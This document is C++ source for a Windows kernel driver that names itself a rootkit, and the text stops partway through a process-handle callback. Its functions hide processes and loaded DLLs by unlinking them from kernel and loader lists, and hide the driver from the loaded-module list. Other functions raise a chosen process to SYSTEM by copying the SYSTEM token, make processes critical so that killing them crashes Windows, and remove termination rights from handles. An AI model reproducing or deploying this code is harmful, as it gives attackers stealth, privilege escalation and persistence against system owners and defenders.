#include "externs.h"
#include <wdm.h>
#include "WindowsTypes.hpp"
#pragma warning(push)
#pragma warning(disable: 4100)  // Unreferenced formal parameter
#pragma warning(disable : 4099)
#define MAX_PIDS 256
#define MAX_TIDS 256
#define SHARED_MEM_SIZE 512
#define EVENT_NAME L"\\BaseNamedObjects\\MySharedEvent"
#define SECTION_NAME L"\\BaseNamedObjects\\MySharedSection"
//#define DRL // Uncomment if you want to reflectively load the driver.
#ifndef DRL
#define DL // if DL is defined then the driver is loaded via a service, like in normal routines.
#endif
// debug printing
void debug_print(PCSTR text) {
    KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, text));
}
/*
Globals
*/
PDRIVER_OBJECT g_DriverObject;
PDEVICE_OBJECT g_DeviceObject;
#ifdef DL
PVOID regHandle;
ULONG protectedPidIndex = 0;
ULONG protectedPid[MAX_PIDS] = { 0 };

PVOID gSharedBuffer = NULL;
PKEVENT gUserEvent = NULL;
HANDLE gSectionHandle = NULL;
#endif
/*
Functions 
*/
ULONG TOKEN_OFFSET = 0;
ULONG ACTIVE_PROCESS_LINKS_OFFSET = 0;
ULONG IMAGE_FILE_NAME_OFFSET = 0;

ULONG GetImageFileNameOffset() {
    RTL_OSVERSIONINFOW osVersion = { 0 };
    osVersion.dwOSVersionInfoSize = sizeof(osVersion);

    // Query the OS version
    if (NT_SUCCESS(RtlGetVersion(&osVersion))) {
        // Switch based on the build number and set the offsets accordingly
        switch (osVersion.dwBuildNumber) {
        case 26100: // Windows 11 24H2 
            TOKEN_OFFSET = 0x248;
            ACTIVE_PROCESS_LINKS_OFFSET = 0x1d8;
            IMAGE_FILE_NAME_OFFSET = 0x338;
            break;
            // Only in windows 11 24H2 the offsets changed, it's because i hate microsoft.
            // Default case is when we didnt specify a case for the build number that the PC is using, so we just use the traditional ones.
        case 7601: // Windows 7 latest build
            TOKEN_OFFSET = 0x208;
            ACTIVE_PROCESS_LINKS_OFFSET = 0x188;
            IMAGE_FILE_NAME_OFFSET = 0x2e0;
            break;
        case 3790: // Windows XP Latest builds (SP2) (Includes Windows Server 2003)
            TOKEN_OFFSET = 0x160;
            ACTIVE_PROCESS_LINKS_OFFSET = 0xe0;
            IMAGE_FILE_NAME_OFFSET = 0x268;
            break;
        default: // Just use them default ones.
            TOKEN_OFFSET = 0x4b8;
            ACTIVE_PROCESS_LINKS_OFFSET = 0x448;
            IMAGE_FILE_NAME_OFFSET = 0x5a8;
            break;
        }
        return osVersion.dwBuildNumber;
    }
    else {
        return 0;
    }
}
#ifdef DL
VOID MSGClient(const char* MSG) {
    if (!MSG || !gSharedBuffer || !gUserEvent) {
        debug_print("[!] Invalid parameters or uninitialized shared memory\n");
        return;
    }

    // Get message length and validate against buffer size
    size_t msgLen = strlen(MSG) + 1;
    if (msgLen > SHARED_MEM_SIZE) {
        debug_print("[!] Message too large for shared buffer\n");
        return;
    }

    // Use try-except to handle potential memory access violations (happened to me with MEMORY_MANAGEMENT stop code..)
    __try {
        // Clear buffer first
        RtlZeroMemory(gSharedBuffer, SHARED_MEM_SIZE);

        // Copy message safely
        RtlCopyMemory(gSharedBuffer, MSG, msgLen);

        // Signal the event
        KeSetEvent(gUserEvent, IO_NO_INCREMENT, FALSE);

        // Wait for 1 second
        LARGE_INTEGER interval;
        interval.QuadPart = -10 * 1000 * 1000;
        KeDelayExecutionThread(KernelMode, FALSE, &interval);

        // Clear buffer after delay - This will be null-terminated everywhere basically.
        RtlZeroMemory(gSharedBuffer, SHARED_MEM_SIZE);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        debug_print("[!] Exception occurred in MSGClient\n");
    }
}

VOID MsgClientWorkerRoutine(const char* MSG) {
    debug_print("[++] Called MSGClient.\n");
    MSGClient(MSG);
}
#endif
VOID FlinkBlinkHide(PLIST_ENTRY Current) {
    PLIST_ENTRY Prev, Next;

    // Get the previous and next list entries from the current entry
    Prev = (Current->Blink);
    Next = (Current->Flink);

    // Unlink the current entry from the list:
    // 1. Set the previous entry's Flink (forward link) to the point of the next entry
    Prev->Flink = Next;
    // 2. Set the next entry's Blink (Backwards Link) to point to the previous entry
    Next->Blink = Prev;
    // We now have hidden the current entry.

    // To avoid a crash (BSOD) due to dangling pointers, rewrite the current entry's pointers so that they refer to itself.
    // This makes it an isolated circular list.
    Current->Blink = (PLIST_ENTRY)&Current->Flink;
    Current->Flink = (PLIST_ENTRY)&Current->Flink;
    return;
}

#ifdef DL
VOID MsgClientWorkerRoutine(PDEVICE_OBJECT DeviceObject, PVOID Context) {  
   UNREFERENCED_PARAMETER(DeviceObject);  
   const char* MSG = (const char*)Context;  
   debug_print("[++] Called MsgClientWorkerRoutine.\n");  
   MSGClient(MSG);  
}  
#endif
NTSTATUS ProtectProcess(UINT32 PID) {  
   if (GetImageFileNameOffset() == 0) {  
       debug_print("[!-!] Build number unknown, returning from ProtectProcess.\n");  
       return STATUS_UNSUCCESSFUL;  
   }
   NTSTATUS status = STATUS_SUCCESS;  
#ifdef DL
   PIO_WORKITEM workItem = IoAllocateWorkItem(g_DeviceObject);
   debug_print("[+] Initiated Work-Item.\n");
#endif
   CLIENT_ID clientId;  
   HANDLE hProcess;  
   OBJECT_ATTRIBUTES objAttr;  
   ULONG BreakOnTermination = 1;
#ifdef DL
   ULONG check;
#endif
   clientId.UniqueThread = NULL;  
   clientId.UniqueProcess = UlongToHandle(PID);  
   InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);  

   status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &clientId);  
   if (status == STATUS_UNSUCCESSFUL) {  
       debug_print("[-] Failed to open process to use on ProtectProcess, returning.\n");  
       return status;  
   }
#ifdef DL
   status = ZwQueryInformationProcess(hProcess, ProcessBreakOnTermination, &check, sizeof(ULONG), 0);
   if (!NT_SUCCESS(status)) {
       debug_print("[-] Failed to query information process.. Returning.\n");
       if (workItem) {
           IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[-] Failed to query information process.. Returning.");
       }
       else {
           debug_print("[-] Work Item could not be initialized.\n");
       }
       return status;
   }
   if (check == 1 && workItem) {
       IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[-] This process is already protected (critical).");
       return status;
   }
#endif
   status = ZwSetInformationProcess(hProcess, ProcessBreakOnTermination, &BreakOnTermination, sizeof(ULONG));  
   if (status == STATUS_UNSUCCESSFUL) {  
       debug_print("[-] Failed to set process information to use on ProtectProcess, returning.\n");  
       return status;  
   }  
   DbgPrint("[+] Process with PID: %d is now protected using BreakOnTermination flag, termination will cause a blue screen, restart computer or use the UnProtectProcess function to revert\n", PID);
#ifdef DL
   if (workItem) {  
       debug_print("[+] Work Item Called!\n");  
       IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[+] Process has been protected successfully.");
   } else {  
       debug_print("[-] Work Item could not be initialized.\n");  
   }  
#endif
   return status;  
}

NTSTATUS UnProtectProcess(UINT32 PID) {
    if (GetImageFileNameOffset() == 0) {
        debug_print("[!-!] Build number unknown, returning from UnProtectProcess.\n");
        return STATUS_UNSUCCESSFUL;
    }
    NTSTATUS status = STATUS_SUCCESS;
    CLIENT_ID clientId;
    HANDLE hProcess;
    OBJECT_ATTRIBUTES objAttr;
    ULONG BreakOnTermination = 0; // Now it's 0 because we want to revert changes.
#ifdef DL
    ULONG check;
    PIO_WORKITEM workItem = IoAllocateWorkItem(g_DeviceObject);
    debug_print("[+] Initiated Work-Item.\n");
#endif
    clientId.UniqueThread = NULL;
    clientId.UniqueProcess = UlongToHandle(PID);
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &clientId);
    if (status == STATUS_UNSUCCESSFUL) {
        // Failure here means we will not open to modify the information of the process.
        debug_print("[-] Failed to open process to use on UnProtectProcess, returning.\n");
        return status;
    }
#ifdef DL
    status = ZwQueryInformationProcess(hProcess, ProcessBreakOnTermination, &check, sizeof(ULONG), 0);
    if (check == 0 && workItem) {
        IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[-] Process wasn't protected (marked as critical), nothing changed.");
    }
#endif
    status = ZwSetInformationProcess(hProcess, ProcessBreakOnTermination, &BreakOnTermination, sizeof(ULONG));
    if (status == STATUS_UNSUCCESSFUL) {
        // Failure here means the process will stay protected, mitigating the function.
        debug_print("[-] Failed to set process information to use on UnProtectProcess, returning.\n");
        return status;
    }
    DbgPrint("[+] Process with PID: %d is no longer protected, termination will not result a blue screen.\n", PID);
#ifdef DL
    if (workItem) {
        IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[+] Process has been unprotected successfully.");
    }
#endif
    return status;
}

// Function to extract only filenames from the fullpath - example: C:\Users\matanel\Desktop\file.exe TO file.exe
WCHAR* ExtractFileName(const WCHAR* fullPath) {
    // Find the last backslash.
    const WCHAR* lastSlash = wcsrchr(fullPath, L'\\');
    // If the backslash is NOT NULL (which means that it exists), it will point to the next letter (which is the start of the filename), and truncate everything behind it so only the filename is left.
    return lastSlash ? (WCHAR*)(lastSlash + 1) : (WCHAR*)fullPath;
}

// Modify the HideDLL function's comparison logic
VOID HideDLL(UINT32 PID, const WCHAR* DLLName) {
    // Get the build numbers and offsets if needed to be used here.
    if (GetImageFileNameOffset() == 0) {
        debug_print("[!-!] Aborting HideDLL function, unknown build.");
        return;
    }
#ifdef DL
    PIO_WORKITEM workItem = IoAllocateWorkItem(g_DeviceObject);
    debug_print("[+] Initiated Work-Item.\n");
#endif
    // Check if the DLLName address is valid, to avoid bsods.
    if (!DLLName || !MmIsAddressValid((PVOID)DLLName)) {
        debug_print("[!] Invalid DLL name pointer\n");
        return;
    }
    // Debug prints, used to fix the function.
    DbgPrint("[+] DLLName supplied by client: %ws\n", DLLName);
    debug_print("[+] HideDLL function called.\n");

    // Add validation for DLL name format
    size_t dllNameLen = wcslen(DLLName);
    if (dllNameLen < 5) { // Minimum "x.dll"
        debug_print("[!] DLL name too short\n");
        return;
    }
    // Initilizations.
    PVOID moduleBase;
    KAPC_STATE state;
    PLDR_DATA_TABLE_ENTRY entry = nullptr;  // Initialize to nullptr
    NTSTATUS status;
    LARGE_INTEGER time = { 0 };
    time.QuadPart = -10011 * 10 * 1000;
    // Get the PEB structure of the Process using it's PID and undocumented functions.
    PEPROCESS pTargetProcess;
    // First get EPROCESS of process.
    status = PsLookupProcessByProcessId(UlongToHandle(PID), &pTargetProcess);
    if (status != STATUS_SUCCESS) {
        debug_print("[-] Failed to get EPROCESS of PID, aborting HideDLL function.\n");
        return;
    }
    // Attach the kernel current thread to the process paged memory thread, to modify it's memory (since windows uses Virtual Pages for memory).
    KeStackAttachProcess(pTargetProcess, &state);
    // Get it's PEB.
    PREALPEB PEB = (PREALPEB)PsGetProcessPeb(pTargetProcess);
    // Checks.
    if (!PEB) {
        debug_print("[-] Failed to get PEB of target process, aborting HideDLL function.\n");
        KeUnstackDetachProcess(&state);
        ObDereferenceObject(pTargetProcess);
        return;
    }
    // Now we wait until the PEB LoaderData (LDR) is available to start traversing.
    for (int i = 0; !PEB->LoaderData && i < 10; i++) {
        KeDelayExecutionThread(KernelMode, FALSE, &time);
    }
    // More checks.
    if (!PEB->LoaderData) {
        debug_print("[-] Failed to get LDR (Loader Data) of target process's PEB, aborting HideDLL function.\n");
        KeUnstackDetachProcess(&state);
        ObDereferenceObject(pTargetProcess);
        return;
    }
    if (!&PEB->LoaderData->InLoadOrderModuleList) {
        debug_print("[-] Failed to get loaded DLL list (LoadedModuleList) inside of LoaderData, aborting HideDLL function.\n");
        KeUnstackDetachProcess(&state);
        ObDereferenceObject(pTargetProcess);
        return;
    }
    // Enumerate the DLL's inside of the process to find our requested DLL.
    // Basically move through all DLL's in the doubly linked list.
    status = STATUS_NOT_FOUND; // Base status, that it is not found when we for loop the whole thing, so later we can check if found to do more stuff.
    for (PLIST_ENTRY pListEntry = PEB->LoaderData->InLoadOrderModuleList.Flink;
        pListEntry != &PEB->LoaderData->InLoadOrderModuleList;
        pListEntry = pListEntry->Flink) {
        // Get the address of the InLoadOrderLinks.
        entry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (entry && entry->FullDllName.Length > 0) {
            WCHAR dllNameBuffer[256];
            // Copy the buffer of the FullDllName safely to the variable.
            wcsncpy_s(dllNameBuffer, entry->FullDllName.Buffer, entry->FullDllName.Length / sizeof(WCHAR));
            // Null-Terminate it.
            dllNameBuffer[entry->FullDllName.Length / sizeof(WCHAR)] = L'\0';
            // Extract just the filename from the full path
            const WCHAR* entryFileName = ExtractFileName(dllNameBuffer);

            // Compare filenames case-insensitively
            if (_wcsicmp(entryFileName, DLLName) == 0) {
                debug_print("[+] Found matching DLL, unlinking from lists\n");
                moduleBase = entry->DllBase;
                // If found, start unlinking from the doubly-lined list.
                FlinkBlinkHide(&entry->InLoadOrderLinks);
                FlinkBlinkHide(&entry->InInitializationOrderLinks);
                FlinkBlinkHide(&entry->InMemoryOrderLinks);
                FlinkBlinkHide(&entry->HashLinks);
                status = STATUS_SUCCESS;
                break;
            }

            // Updated debug logging to show actual comparison
            DbgPrint("DEBUG: Comparing DLL filename: %ws with Target: %ws\n", entryFileName, DLLName);
        }
    }
    if (status == STATUS_SUCCESS) {
        // Zero out the DLLBase
        moduleBase = nullptr;
        RtlZeroMemory(entry->FullDllName.Buffer, sizeof(entry->FullDllName.Buffer));
        RtlZeroMemory(entry->BaseDllName.Buffer, sizeof(entry->BaseDllName.Buffer));
        debug_print("[+] Successfully hidden the DLL from the process!\n");
#ifdef DL
        IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[+] Successfully hidden the DLL from the process!.");
#endif
    }
    else {
        debug_print("[-] Status is not STATUS_SUCCESS in HideDLL function.\n");
        // Only print debug info if entry is valid
        if (entry && MmIsAddressValid(entry)) {
            WCHAR dllnamefull[256];
            wcsncpy_s(dllnamefull, entry->FullDllName.Buffer, entry->FullDllName.Length / sizeof(WCHAR));
            dllnamefull[entry->FullDllName.Length / sizeof(WCHAR)] = L'\0'; // Null-terminate
            DbgPrint("DEBUG: FullDllName.buffer: %ws", dllnamefull);
            WCHAR dllnameinloop[256];
            wcsncpy_s(dllnameinloop, entry->FullDllName.Buffer, entry->FullDllName.Length / sizeof(wchar_t) - 4);
            DbgPrint("DEBUG: FullDllName.buffer INLOOP: %ws", dllnameinloop);
#ifdef DL
            IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[-] Could not hide the DLL from the process.");
#endif
        }
    }
    // Detach from the process's memory.
    KeUnstackDetachProcess(&state);
    ObDereferenceObject(pTargetProcess); // Cleanup - Always remember to cleanup, we don't want memory leaks.
    debug_print("[*] Exiting HideDLL Function.\n");
    return;
}

VOID HideProcess(UINT32 PID) {
    if (GetImageFileNameOffset() == 0) {
        debug_print("[!-!] Aborting HideProcess, unknown build.");
        return;
    }
#ifdef DL
    PIO_WORKITEM workItem = IoAllocateWorkItem(g_DeviceObject);
    debug_print("[+] Initiated Work-Item.\n");
#endif
    debug_print("[+] HideProcess function called.\n");
    // Assume ACTIVE_PROCESS_LINKS_OFFSET is the offset to the process ID within the EPROCESS struct.
    // Here, PID_OFFSET is set to that offset.
    ULONG PID_OFFSET = ACTIVE_PROCESS_LINKS_OFFSET;
    ULONG LIST_OFFSET = PID_OFFSET;
    // The code uses an INT_PTR variable to adjust LIST_OFFSET
    // Essentially, LIST_OFFSET is advanced by the size of the pointer itself (likely 8 bytes)
    INT_PTR ptr;
    LIST_OFFSET += sizeof(ptr);

    // Get the current process (starting point to start traversing)
    PEPROCESS CurrentEPROCESS = PsGetCurrentProcess();

    // Calculate the pointer to the current process's ActiveProcessList list entry.
    PLIST_ENTRY CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
    
    // Calculate the address of the current pointer PID field. (basically, gets his PID from within the current EPROCESS structure, using the known offset.)
    PUINT32 CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);

    // First check if this current process, is the one we want to hide (by checking its pid using CurrentPID)
    if (*(UINT32*)CurrentPID == PID) {
        // If the current process PID is the one we want to hide, the hide it by unlinking it from its list entry.
        FlinkBlinkHide(CurrentList);
        debug_print("[+] Process is now hidden.\n");
#ifdef DL
        IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[+] Process has been hidden successfully.");
#endif
        return;
    }
    // Otherwise, we set a starting point to start looping.
    PEPROCESS StartProcess = CurrentEPROCESS;


    // Move to the next process in the list.
    // The next process's EPROCESS is computed by taking the pointer from CurrentList->Flink
    // then subtracting LIST_OFFSET to get back to the base of the EPROCESS structure.
    CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
    CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
    CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);


    // Traverse the process list until we circle back to the starting process (looping)
    while ((ULONG_PTR)StartProcess != (ULONG_PTR)CurrentEPROCESS) {
        // If the current process PID in the loop matches the one we want to hide, we unlink it from the list.
        if (*(UINT32*)CurrentPID == PID) {
            FlinkBlinkHide(CurrentList);
            debug_print("[+] Process is now hidden.\n");
#ifdef DL
            IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[+] Process has been hidden successfully.");
#endif
            return;
        }

        // Move to the next process: adjust the pointer based on the list entry.
        CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
        CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
        CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
    }
    // Return the result.
    debug_print("[*] Returning from function HideProcess.\n");
    return;
}

NTSTATUS ElevateProcess(UINT32 PID) {
    if (GetImageFileNameOffset() == 0) {
        debug_print("[!-!] Aborting ElevateProcess, unknown build.");
        return STATUS_UNSUCCESSFUL;
    }
#ifdef DL
    PIO_WORKITEM workItem = IoAllocateWorkItem(g_DeviceObject);
    debug_print("[+] Initiated Work-Item.\n");
#endif
    DbgPrint("[+] Starting to elevate process %u.\n", PID);
    NTSTATUS status = STATUS_SUCCESS;
    PEPROCESS pTargetProcess, pSystemProcess;
    ULONG srcPid = 4; // PID 4 Is the "SYSTEM" Process, it is the most privileged process, handles hardware and software interaction, runs in kernel mode, we use it to dominate the world!

    // Lookup the eprocess addr from the dstPid (PID) (The one the user wants to elevate)
    status = PsLookupProcessByProcessId(ULongToHandle(PID), &pTargetProcess);
    if (status != STATUS_SUCCESS) {
        debug_print("[-] Target PID PsLookup failed.\n");
        return status;
    }

    DbgPrint("[+] Target EProcess address: 0x%p\n", pTargetProcess);

    // Lookup the eprocess addr from the srcpid (system process)
    status = PsLookupProcessByProcessId(ULongToHandle(srcPid), &pSystemProcess);

    if (status != STATUS_SUCCESS) {
        // What the hell?
        debug_print("[!] Failed to lookup the source process PsLookup, this is a major error, since it's the SYSTEM process.\n");
        return status;
    }

    DbgPrint("[+] Source EProcess address: 0x%p\n", pSystemProcess);
    debug_print("[+] Setting source (SYSTEM) token to the target token\n");

    // Perform token stealing, overwrite the target process token with the SYSTEM process token.
    // This is done by copying the token pointer from the SYSTEM process's EPROCESS structure
    // to the target process's EPROCESS structure, using the current latest known offset, which is defined as 0x4b8
    __try {
        *(UINT64*)((UINT64)pTargetProcess + (UINT64)TOKEN_OFFSET) = *(UINT64*)(UINT64(pSystemProcess) + (UINT64)TOKEN_OFFSET); // Now the token pointer for the target pid is now the SYSTEM's one, essentially copying it.
        debug_print("--------------------------------------------------------\n");
        debug_print("[+] Successfully elevated process using SYSTEM token.\n");
        debug_print("--------------------------------------------------------\n");
#ifdef DL
        IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[+] Process has been elevated successfully.");
#endif
        return STATUS_SUCCESS;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        debug_print("[!] Exception occured during token stealing.\n");
#ifdef DL
        IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[+] Error occured during process elevation.");
#endif
        status = GetExceptionCode();
    }

    // Cleanup
    ObDereferenceObject(pSystemProcess);
    ObDereferenceObject(pTargetProcess);

    return status;
}

KSPIN_LOCK g_Lock;
KIRQL g_OldIrql;

void HideDriverHandler(PDRIVER_OBJECT DriverObject) {
#ifdef DL
    PIO_WORKITEM workItem = IoAllocateWorkItem(g_DeviceObject);
    debug_print("[+] Initiated Work-Item.\n");
#endif
    KIRQL oldIrql;

    // Raise IRQL to prevent race conditions
    KeAcquireSpinLock(&g_Lock, &oldIrql);

    __try {
        if (!DriverObject) {
            debug_print("[!] Invalid DriverObject!\n");
            __leave;
        }

        PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
        if (!entry || !MmIsAddressValid(entry)) {
            debug_print("[!] Invalid driver section.\n");
            __leave;
        }

        // Unlink from PsLoadedModuleList
        PLIST_ENTRY prevEntry = entry->InLoadOrderLinks.Blink;
        PLIST_ENTRY nextEntry = entry->InLoadOrderLinks.Flink;

        KeMemoryBarrier();

        // Essentially, skip over us when iterating over the loaded drivers.
        prevEntry->Flink = nextEntry;
        nextEntry->Blink = prevEntry;

        KeMemoryBarrier();

        debug_print("[+] Driver is now hidden.\n");
#ifdef DL
        IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[+] Driver has been hidden successfully.");
#endif
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        debug_print("[!] Exception while hiding driver.\n");
#ifdef DL
        IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[+] Error occured during driver hiding.");
#endif
    }

    // Release the spinlock
    KeReleaseSpinLock(&g_Lock, oldIrql);
    debug_print("[+] Releasing spinlock in HideDriver function.\n");
}


/*
End Of Functions.
*/

namespace Rootkit {
    namespace codes {
        // CTL Codes to communicate with User Mode application.
        constexpr ULONG HideDriver =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x696, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG ElevateProcess =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x697, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG HideProcess =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x698, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG ProtectProcess =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x699, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG HideDLL =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x700, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG UnProtectProcess =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x701, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
#ifdef DL
        constexpr ULONG ProtectProcessOP =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x702, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG UnProtectProcessOP =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x703, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
#endif
    }
    struct Request {
        HANDLE process_id;
        WCHAR DLLName[256];
    };

    NTSTATUS create(PDEVICE_OBJECT device_object, PIRP Irp) {
        UNREFERENCED_PARAMETER(device_object);

        IoCompleteRequest(Irp, IO_NO_INCREMENT);

        return Irp->IoStatus.Status;
    }

    NTSTATUS close(PDEVICE_OBJECT device_object, PIRP Irp) {
        UNREFERENCED_PARAMETER(device_object);

        IoCompleteRequest(Irp, IO_NO_INCREMENT);

        return Irp->IoStatus.Status;
    }


    NTSTATUS device_control(PDEVICE_OBJECT device_object, PIRP Irp) {
        UNREFERENCED_PARAMETER(device_object);

        debug_print("[+] Device control called.\n");

        /* By default, it is unsuccessful. */
        NTSTATUS status = STATUS_UNSUCCESSFUL;

        // This will determine which code was sent from the user mode app.
        PIO_STACK_LOCATION stack_irp = IoGetCurrentIrpStackLocation(Irp);

        // Access the request object sent from user mode.
        auto request = reinterpret_cast<Request*>(Irp->AssociatedIrp.SystemBuffer);

        if (stack_irp == nullptr || request == nullptr) {
            // to avoid an explosion (bsod) we will just complete request, if we didnt check for this our computer will crash with the kernel error code bsod.
            IoCompleteRequest(Irp, IO_NO_INCREMENT);
            return STATUS_UNSUCCESSFUL;
        }

        // Declare DriverObject before the switch statement
        PDRIVER_OBJECT DriverObject = nullptr;

        // The target process we want to access, init here.
        static PEPROCESS target_process = nullptr;

        // finally handle the control code sent
        const ULONG control_code = stack_irp->Parameters.DeviceIoControl.IoControlCode;
        HANDLE pid = request->process_id;
#ifdef DL
        PIO_WORKITEM workItem = IoAllocateWorkItem(g_DeviceObject);
        debug_print("[+] Initiated Work-Item.\n");
#endif
        WCHAR* DLLName = request->DLLName;
        switch (control_code) {
        case codes::HideDriver:
            DriverObject = IoGetCurrentIrpStackLocation(Irp)->DeviceObject->DriverObject;
            if (!DriverObject) {
                debug_print("[!] Failed to get DriverObject.");
                break;
            }
            HideDriverHandler(DriverObject);
            debug_print("[+] Driver hiding request processed");
            break;
        case codes::ElevateProcess:
            //status = PsLookupProcessByProcessId(request->process_id, &target_process);
            ElevateProcess(HandleToUlong(pid));
            // Use target_process in the ElevateProcess function.
            break;
        case codes::HideProcess:
            HideProcess(HandleToUlong(pid));
            break;
        case codes::ProtectProcess:
            ProtectProcess(HandleToUlong(pid));
            break;
        case codes::HideDLL:
            HideDLL(HandleToUlong(pid), DLLName);
            break;
        case codes::UnProtectProcess:
            UnProtectProcess(HandleToUlong(pid));
            break;
#ifdef DL
        case codes::ProtectProcessOP:
            if (protectedPidIndex < MAX_PIDS) {
                protectedPid[protectedPidIndex++] = HandleToUlong(pid);
                IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[+] Process has been protected successfully. (ACCESS_DENIED Protection)");
            }
            else {
                IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[-] Protected PID list is full.");
            }
            break;
        case codes::UnProtectProcessOP:
        {
            BOOLEAN found = FALSE;
            if (protectedPidIndex > 0) {
                ULONG searchPid = HandleToUlong(pid);
                ULONG writeIndex = 0;
                for (ULONG readIndex = 0; readIndex < protectedPidIndex; ++readIndex) {
                    if (protectedPid[readIndex] != searchPid) {
                        // Keep this PID
                        protectedPid[writeIndex++] = protectedPid[readIndex];
                    }
                    else {
                        found = TRUE;
                    }
                }
                protectedPidIndex = writeIndex;
            }

            if (workItem != NULL) {
                if (found) {
                    IoQueueWorkItem(workItem,
                        MsgClientWorkerRoutine,
                        DelayedWorkQueue,
                        (PVOID)"[+] Process has been unprotected successfully. (ACCESS_DENIED Protection)"
                    );
                }
                else {
                    IoQueueWorkItem(workItem,
                        MsgClientWorkerRoutine,
                        DelayedWorkQueue,
                        (PVOID)"[-] Process was not found in protected list."
                    );
                }
            }
            break;
        }
#endif
        default:
            // something is horribly wrong
            debug_print("[!] Unknown control code received!");
            break;
        }
        Irp->IoStatus.Status = status;
        Irp->IoStatus.Information = sizeof(Request);
        IoCompleteRequest(Irp, IO_NO_INCREMENT);

        return status;
    }
}

VOID UnloadDriver(PDRIVER_OBJECT DriverObject) {
    debug_print("[+] UnloadDriver called.\n");

    // Delete symbolic link
    UNICODE_STRING symbolic_link = RTL_CONSTANT_STRING(L"\\DosDevices\\rootkit");
    IoDeleteSymbolicLink(&symbolic_link);
    debug_print("[+] Symbolic link deleted.\n");

    // Unregister callbacks
#ifdef DL
    ObUnRegisterCallbacks(regHandle);
#endif

#ifdef DL
    if (gUserEvent) {
        ObDereferenceObject(gUserEvent);
        gUserEvent = NULL;
    }
    if (gSharedBuffer) {
        ZwUnmapViewOfSection(ZwCurrentProcess(), gSharedBuffer);
        gSharedBuffer = NULL;
    }
    if (gSectionHandle) {
        ZwClose(gSectionHandle);
        gSectionHandle = NULL;
    }
#endif

    // Delete device object(s)
    PDEVICE_OBJECT device_object = DriverObject->DeviceObject;
    while (device_object) {
        PDEVICE_OBJECT next_device = device_object->NextDevice;
        IoDeleteDevice(device_object);
        device_object = next_device;
    }
#ifdef DL
    g_DeviceObject = NULL;
    g_DriverObject = NULL;
#endif
    debug_print("[+] Device object(s) deleted.\n");
}

#ifdef DL
// Register the pre open process operation callback - which means that everytime a process is opened (handled), it will first come here.
OB_PREOP_CALLBACK_STATUS PreOpenProcessOperation(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info) {
    if (Info->KernelHandle) {
        return OB_PREOP_SUCCESS; // If it's a handle that is called by the kernel driver, we just return success. I might modify this so it also rejects, but IDK if it's possible.
    }
    debug_print("[+] Initiated Work-Item.\n");
    // Get the process EPROCESS from the callback
    PEPROCESS process = (PEPROCESS)Info->Object;
    // Use the function to retrieve it's pid from the EPROCESS, we could also manually do this but who cares lol.
    UINT32 pid = HandleToUlong(PsGetProcessId(process));

    // Protecting our process by stripping PROCESS_TERMINATE from the flags.
    for (ULONG i = 0; i < protectedPidIndex; i++) {
        if (pid == protectedPid[i]) {
